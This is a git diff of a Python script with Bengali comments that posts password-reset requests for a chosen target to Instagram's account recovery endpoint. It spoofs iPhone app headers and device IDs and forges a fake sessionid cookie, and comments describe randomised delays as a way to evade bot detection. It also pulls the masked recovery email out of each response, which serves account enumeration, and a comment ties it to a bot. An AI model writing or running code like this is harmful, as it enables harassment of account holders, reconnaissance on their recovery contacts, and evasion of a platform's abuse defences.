@@ -1,24 +1,26 @@
-import random
-import re
 import httpx
+import re
+import random
 import uuid
 import time
 
-# 🚨 ট্রিক: প্রতিবার নতুন iPhone মডেল ও iOS ভার্সন তৈরি হবে
+# রিয়েল iOS ডিভাইস ও ভার্সন
 IOS_VERSIONS = ["16.1", "16.6", "17.0", "17.2", "17.4", "17.5"]
 DEVICES = [
     ("iPhone14,2", "iPhone 13 Pro"), ("iPhone15,2", "iPhone 14 Pro"),
     ("iPhone16,1", "iPhone 15 Pro"), ("iPhone16,2", "iPhone 15 Pro Max")
 ]
-LOCALES = ["en-US,en;q=0.9", "tr-TR,tr;q=0.9", "en-GB,en;q=0.9", "id-ID,id;q=0.9"]
+LOCALES = ["en-US,en;q=0.9", "tr-TR,tr;q=0.9", "en-GB,en;q=0.9"]
 
-def get_advanced_headers():
+def get_headers():
     ios = random.choice(IOS_VERSIONS)
     dev_id, dev_name = random.choice(DEVICES)
     locale = random.choice(LOCALES)
-    csrf = str(uuid.uuid4())
     
-    # আসল ইনস্টাগ্রাম মোবাইল অ্যাপের হেডার্স
+    # র‍্যান্ডম CSRF এবং সেশন কুকি তৈরি
+    csrf = str(uuid.uuid4())
+    session_id = f"{random.randint(10,99)}%3A{random.randint(1000000000, 9999999999)}%3A{random.randint(10,99)}%3A{csrf[:10]}"
+    
     ua = f"Instagram 312.0.0.34.114 (iPhone; iOS {ios}; {locale}; {dev_name}; {dev_id})"
     
     return {
@@ -31,14 +33,15 @@ def get_advanced_headers():
         "x-device-id": ''.join(random.choices('0123456789abcdef', k=16)),
         "accept-language": locale,
         "content-type": "application/x-www-form-urlencoded",
-        "Cookie": f"csrftoken={csrf}; ig_did={str(uuid.uuid4()).upper()};"
+        # কুকি স্পুফিং (ফেক সেশন)
+        "Cookie": f"csrftoken={csrf}; ig_did={str(uuid.uuid4()).upper()}; ig_nrcb=1; sessionid={session_id};"
     }
 
 URL = "https://i.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
 
 def send_reset(target):
-    # 🚨 ট্রিক: র‍্যান্ডম স্লিপ (বট ডিটেকশন এড়াতে ২-৪ সেকেন্ড দেরি হবে)
-    time.sleep(random.uniform(2.0, 4.0))
+    # বট ডিটেকশন এড়াতে ২-৫ সেকেন্ড দেরি
+    time.sleep(random.uniform(2.0, 5.0))
     
     payload = {
         "email_or_username": target, 
@@ -48,25 +51,28 @@ def send_reset(target):
     }
 
     try:
-        # http2=True ব্যবহার করা হয়েছে যাতে TLS ফিঙ্গারপ্রিন্ট বাইপাস হয়
-        with httpx.Client(http2=True, headers=get_advanced_headers(), timeout=25.0) as client:
+        with httpx.Client(http2=True, headers=get_headers(), timeout=30.0) as client:
             o = client.post(URL, data=payload)
-            c = o.text
+            c = o.text.lower()
             
-            # ইমেইল খোঁজা (Masked Email)
-            ev = re.search(r'[a-zA-Z0-9\*\._%+-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,}', c)
-            
-            if ev:
-                return f"email:{ev.group(0)}"
-            elif "+" in c.lower():
-                return "phone"
-            elif "fail" in c.lower() or "no user found" in c.lower():
-                return "error:not_found"
-            elif "rate limit" in c.lower() or o.status_code == 429:
+            # রেসপন্স চেক
+            if o.status_code == 429 or "rate limit" in c:
                 return "error:rate_limited"
-            else:
-                # যদি কোনো এরর না আসে, ধরে নেওয়া হবে মেইল সেন্ট হয়েছে
-                return "phone"
+            
+            ev = re.search(r'[a-zA-Z0-9\*\._%+-]+@[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,}', c)
+            if ev: 
+                return f"email:{ev.group(0)}"
                 
+            if "fail" in c or "no user found" in c:
+                return "error:not_found"
+                
+            return "phone"
+            
+    except httpx.TimeoutException:
+        return "error:timeout"
     except Exception as e:
         return f"error:{type(e).__name__}"
+
+# bot.py এর সাথে মিল রাখার জন্য
+def gen_headers():
+    return get_headers()
